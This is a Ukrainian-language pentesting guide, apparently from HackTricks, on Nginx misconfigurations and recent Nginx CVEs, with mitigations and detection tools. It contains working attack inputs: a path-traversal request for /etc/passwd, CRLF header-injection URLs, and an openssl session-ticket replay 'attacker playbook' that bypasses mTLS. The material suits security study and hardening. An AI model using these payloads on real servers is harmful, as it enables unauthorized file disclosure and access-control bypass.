# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Відсутнє root-розташування <a href="#missing-root-location" id="missing-root-location"></a>

Під час конфігурації сервера Nginx, **root directive** відіграє критичну роль, визначаючи базовий каталог, з якого віддаються файли. Розгляньте приклад нижче:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
У цій конфігурації `/etc/nginx` призначено кореневою директорією. Це налаштування дозволяє доступ до файлів у вказаній кореневій директорії, наприклад `/hello.txt`. Однак важливо зазначити, що визначено лише конкретний location (`/hello.txt`). Немає конфігурації для кореневого location (`location / {...}`). Через цей пропуск директива root застосовується глобально, дозволяючи запитам до кореневого шляху `/` отримувати доступ до файлів під `/etc/nginx`.

Це створює критичну загрозу безпеці. Простий `GET` запит, наприклад `GET /nginx.conf`, може викрити конфіденційну інформацію, віддавши файл конфігурації Nginx, що знаходиться за `/etc/nginx/nginx.conf`. Встановлення root на менш чутливу директорію, наприклад `/etc`, може знизити цей ризик, але все одно може дозволити ненавмисний доступ до інших критичних файлів, включно з іншими файлами конфігурації, логами доступу та навіть зашифрованими обліковими даними, що використовуються для HTTP basic authentication.

## Alias LFI Неправильна конфігурація <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

У файлах конфігурації Nginx варто ретельно перевіряти директиви "location". Вразливість, відома як Local File Inclusion (LFI), може бути ненавмисно введена через конфігурацію, що нагадує наступну:
```
location /imgs {
alias /path/images/;
}
```
Ця конфігурація вразлива до LFI attacks через те, що сервер інтерпретує запити на кшталт `/imgs../flag.txt` як спробу доступу до файлів за межами призначеного каталогу, фактично розв'язуючись у `/path/images/../flag.txt`. Ця вразливість дозволяє зловмисникам отримувати файли з файлової системи сервера, які не повинні бути доступні через веб.

Щоб пом'якшити цю вразливість, конфігурацію слід відкоригувати так:
```
location /imgs/ {
alias /path/images/;
}
```
Детальніше: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Тести Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Небезпечне обмеження шляху <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Перегляньте наступну сторінку, щоб дізнатися, як обійти такі директиви:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Небезпечне використання змінних / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Вразливі змінні `$uri` і `$document_ur`i, і це можна виправити, замінивши їх на `$request_uri`.
>
> Регулярний вираз також може бути вразливим, наприклад:
>
> `location ~ /docs/([^/])? { … $1 … }` - Вразливий
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Не вразливий (перевірка пробілів)
>
> `location ~ /docs/(.*)? { … $1 … }` - Не вразливий

Нижче наведено приклад вразливості в конфігурації Nginx:
```
location / {
return 302 https://example.com$uri;
}
```
Символи \r (Carriage Return) та \n (Line Feed) позначають символи нового рядка в HTTP-запитах, а їх URL-кодовані форми представлені як `%0d%0a`. Включення цих символів у запит (наприклад, `http://localhost/%0d%0aDetectify:%20clrf`) до неправильно налаштованого сервера призводить до того, що сервер додає новий заголовок з іменем `Detectify`. Це відбувається тому, що змінна $uri декодує URL-кодовані символи нового рядка, що призводить до небажаного заголовка у відповіді:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Дізнайтеся більше про ризики CRLF injection і response splitting за адресою [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Також ця техніка [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) з деякими вразливими прикладами та механізмами виявлення. Наприклад, щоб виявити цю конфігураційну помилку з точки зору blackbox, ви можете виконати такі запити:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Якщо вразливий, перший поверне відповідь, оскільки "X" може бути будь-яким HTTP методом, а другий поверне помилку, оскільки H не є дійсним методом. Тож сервер отримає щось на кшталт: `GET / H HTTP/1.1` і це спричинить помилку.

Інші приклади виявлення були б:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

У тій доповіді були показані такі вразливі конфігурації:

- Note how **`$uri`** is set as is in the final URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Зверніть увагу, що знову **`$uri`** є в URL (цього разу всередині параметра)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Тепер у AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Будь-яка змінна

Було виявлено, що **дані, надані користувачем**, за певних обставин можуть трактуватися як **Nginx змінна**. Причина такої поведінки залишається дещо невизначеною, втім це явище не є рідкісним і не завжди просто піддається перевірці. Цю аномалію було висвітлено в звіті з безпеки на HackerOne, який можна переглянути [here](https://hackerone.com/reports/370094). Подальше розслідування повідомлення про помилку призвело до виявлення її виникнення в [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), що вказує на Server Side Includes (SSI) як кореневу причину.

Щоб **виявити цю неправильну конфігурацію**, можна виконати наступну команду, яка встановлює заголовок Referer для перевірки виводу змінної:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Сканування на наявність цієї помилкової конфігурації в системах виявило кілька випадків, коли користувач міг виводити змінні Nginx. Однак зменшення кількості вразливих інстанцій свідчить про те, що зусилля з виправлення цієї проблеми були частково успішними.

### Використання try_files із змінними $URI$ARGS

Наступна помилкова конфігурація Nginx може призвести до LFI-вразливості:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
У нашій конфігурації є директива `try_files`, яка використовується для перевірки наявності файлів у вказаному порядку. Nginx віддасть перший знайдений файл. Базовий синтаксис директиви `try_files` виглядає так:
```
try_files file1 file2 ... fileN fallback;
```
Nginx перевіряє наявність кожного файлу у вказаному порядку. Якщо файл існує, він буде негайно відданий. Якщо ж жоден із вказаних файлів не існує, запит буде передано до fallback-опції, яка може бути іншим URI або конкретною сторінкою помилки.

Однак при використанні змінних `$uri$args` у цій директиві Nginx спробує знайти файл, що відповідає URI запиту в поєднанні з будь-якими параметрами рядка запиту. Отже, ми можемо експлуатувати цю конфігурацію:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
З наступним payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Використовуючи наш payload, ми вийдемо за межі кореневої директорії (визначеної в конфігурації Nginx) і завантажимо файл `/etc/passwd`. У debug логах ми можемо спостерігати, як Nginx пробує файли:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC проти Nginx, використовуючи конфігурацію, згадану вище:
![Приклад burp-запиту](../../images/nginx_try_files.png)

## Читання сирої відповіді backend

Nginx пропонує можливість через `proxy_pass`, яка дозволяє перехоплювати помилки та HTTP-заголовки, що генеруються backend, з метою приховати внутрішні повідомлення про помилки та заголовки. Це досягається тим, що Nginx віддає власні сторінки помилок у відповідь на помилки backend. Однак виникають проблеми, коли Nginx отримує некоректний HTTP-запит. Такий запит пересилається на backend у тому вигляді, у якому отриманий, а сира відповідь backend потім безпосередньо надсилається клієнту без втручання Nginx.

Розглянемо приклад сценарію з uWSGI-додатком:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Щоб керувати цим, у конфігурації Nginx використовуються конкретні директиви:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Ця директива дозволяє Nginx відправляти кастомну відповідь для відповідей бекенду зі статусним кодом більше 300. Вона гарантує, що, для нашого прикладу додатку uWSGI, відповідь `500 Error` буде перехоплена і оброблена Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Як випливає з назви, ця директива приховує вказані HTTP-заголовки від клієнта, підвищуючи приватність та безпеку.

Коли надходить дійсний `GET` запит, Nginx обробляє його нормально, повертаючи стандартну помилкову відповідь без розкриття будь-яких секретних заголовків. Однак некоректний HTTP-запит обходить цей механізм, що призводить до витоку сирих відповідей бекенду, включаючи секретні заголовки та повідомлення про помилки.

## merge_slashes вимкнений

За замовчуванням, в Nginx **директива `merge_slashes`** встановлена в **`on`**, що стискає кілька символів "/" у URL до одного. Ця функція, хоча й спрощує обробку URL, може ненавмисно приховувати вразливості в додатках за Nginx, особливо вразливі до local file inclusion (LFI). Експерти з безпеки **Danny Robinson та Rotem Bar** підкреслювали потенційні ризики, пов'язані з цією поведінкою за замовчуванням, особливо коли Nginx виступає як reverse-proxy.

Щоб зменшити такі ризики, рекомендовано **вимкнути директиву `merge_slashes`** для додатків, схильних до таких вразливостей. Це гарантує, що Nginx пересилає запити до додатку без змін структури URL, не маскуючи жодних прихованих проблем безпеки.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious заголовки відповіді**

Як показано в [**цьому розборі**](https://mizu.re/post/cors-playground), існують певні заголовки, які, якщо присутні у відповіді веб-сервера, змінюють поведінку Nginx proxy. Ви можете перевірити їх [**в документації**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: вказує Nginx внутрішньо перенаправити запит на вказане розташування.
- `X-Accel-Buffering`: контролює, чи повинен Nginx буферизувати відповідь.
- `X-Accel-Charset`: задає набір символів для відповіді при використанні X-Accel-Redirect.
- `X-Accel-Expires`: встановлює час протермінування відповіді при використанні X-Accel-Redirect.
- `X-Accel-Limit-Rate`: обмежує швидкість передачі відповіді при використанні X-Accel-Redirect.

Наприклад, заголовок **`X-Accel-Redirect`** спричиняє внутрішній **redirect** в nginx. Тому конфігурація nginx, що містить, наприклад, **`root /`**, і відповідь від веб-сервера з **`X-Accel-Redirect: .env`** призведе до того, що nginx відправить вміст **`/.env`** (Path Traversal).

### **Значення за замовчуванням у директиві map**

У **конфігурації Nginx** директива `map` часто відіграє роль у **контролі авторизації**. Поширена помилка — не вказати значення **default**, що може призвести до несанкціонованого доступу. Наприклад:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Без `default` **зловмисний користувач** може обійти захист, отримавши доступ до **невизначеного URI** в межах `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) радить встановити **значення за замовчуванням**, щоб уникнути таких проблем.

### **DNS Spoofing Vulnerability**

DNS spoofing проти Nginx можливий за певних умов. Якщо зловмисник знає **DNS server**, який використовується Nginx, і може перехоплювати його DNS queries, він може підробити DNS records. Однак цей метод неефективний, якщо Nginx налаштований використовувати **localhost (127.0.0.1)** для DNS resolution. Nginx дозволяє вказати DNS server наступним чином:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` та `internal` директиви**

Директива **`proxy_pass`** використовується для перенаправлення запитів до інших серверів, як внутрішніх, так і зовнішніх. Директива **`internal`** гарантує, що певні локації доступні лише всередині Nginx. Хоча самі по собі ці директиви не є вразливістю, їхню конфігурацію потрібно ретельно перевіряти, щоб уникнути проблем із безпекою.

## proxy_set_header Upgrade & Connection

Якщо nginx сервер налаштовано пропускати заголовки Upgrade та Connection, можна здійснити [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md), щоб отримати доступ до захищених/внутрішніх endpoints.

> [!CAUTION]
> Ця вразливість дозволяє нападникові **встановити пряме з'єднання з `proxy_pass` endpoint** (`http://backend:9999` у цьому випадку), вміст якого не буде перевірятися nginx.

Приклад вразливої конфігурації для викрадення `/flag` можна знайти [тут](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Зауважте, що навіть якщо `proxy_pass` вказував на конкретний **шлях** такий як `http://backend:9999/socket.io`, з'єднання буде встановлено з `http://backend:9999`, тож ви можете **звертатися до будь-якого іншого шляху всередині цієї внутрішньої кінцевої точки. Тому не має значення, чи вказано шлях у URL для proxy_pass.**

## HTTP/3 QUIC модуль віддалений DoS & leak (2024)

У 2024 році Nginx опублікував CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 та CVE-2024-35200, показавши, що одна ворожа QUIC сесія може призвести до аварії робочих процесів або leak пам'яті щоразу, коли експериментальний `ngx_http_v3_module` скомпільовано й відкрито сокет `listen ... quic`. Постраждалі збірки — 1.25.0–1.25.5 і 1.26.0, тоді як 1.27.0/1.26.1 містять виправлення; the memory disclosure (CVE-2024-34161) додатково вимагає MTU більшого за 4096 байт, щоб виявити чутливі дані (деталі — у 2024 nginx advisory, на яке посилаються нижче).

**Recon & exploitation hints**

- HTTP/3 is opt-in, so scan for `Alt-Svc: h3=":443"` responses or brute-force UDP/443 QUIC handshakes; once confirmed, fuzz the handshake and STREAM frames with custom `quiche-client`/`nghttp3` payloads to trigger worker crashes and force log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Обхід перевірки клієнтського сертифіката при відновленні TLS сесії (CVE-2025-23419)

У лютому 2025 року повідомлення про вразливість розкрила, що nginx 1.11.4–1.27.3, зібрані з OpenSSL, дозволяють **повторно використовувати TLS 1.3 session** з одного name-based virtual host в іншому, тому клієнт, який встановив з'єднання з хостом без сертифіката, може відтворити ticket/PSK, щоб потрапити в vhost, захищений `ssl_verify_client on;`, і повністю обійти mTLS. Помилка спрацьовує щоразу, коли кілька virtual hosts ділять один і той же TLS 1.3 session cache і tickets (див. nginx advisory 2025, наведене нижче).

**Плейбук атакувальника**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Якщо ціль вразлива, другий handshake завершується без пред'явлення клієнтського сертифіката, внаслідок чого відкриваються захищені локації.

**Що перевіряти**

- Змішані `server_name` блоки, які використовують спільний `ssl_session_cache shared:SSL` та `ssl_session_tickets on;`.
- Блоки Admin/API, які очікують mTLS, але успадковують налаштування спільного session cache/ticket від публічних хостів.
- Автоматизація, яка глобально вмикає TLS 1.3 session resumption (наприклад, Ansible roles) без урахування ізоляції vhost.

## Стійкість до HTTP/2 Rapid Reset (поведінка CVE-2023-44487)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) все ще впливає на nginx, коли оператори збільшують `keepalive_requests` або `http2_max_concurrent_streams` понад значення за замовчуванням: зловмисник відкриває одне HTTP/2 підключення, заливає його тисячами streams, а потім одразу надсилає `RST_STREAM` фрейми, так що ліміт одночасності ніколи не досягається, у той час як CPU витрачає ресурси на логіку завершення. Nginx defaults (128 concurrent streams, 1000 keepalive requests) тримають радіус ураження малим; значне підвищення цих обмежень робить простим виснаження воркерів навіть від одного клієнта (див. F5 write-up, наведений нижче).

**Поради для виявлення**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Хости, які вказують незвично високі значення для цих директив, є першими цілями: один HTTP/2 клієнт може циклічно створювати потоки та миттєво відправляти `RST_STREAM` кадри, щоб завантажити CPU, не перевищуючи ліміт одночасних з'єднань.

## Спробуйте самостійно

Detectify створив репозиторій на GitHub, де ви можете використати Docker для налаштування власного вразливого тестового сервера Nginx з деякими з помилок конфігурації, обговорених у цій статті, і спробувати знайти їх самостійно!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Інструменти статичного аналізу

### [GIXY](https://github.com/yandex/gixy)

Gixy — інструмент для аналізу конфігурацій Nginx. Головна мета Gixy — запобігання помилкам конфігурації з точки зору безпеки та автоматизація виявлення вразливостей.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner — простий інструмент для пошуку поширених помилок конфігурації Nginx та вразливостей.

## Джерела

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
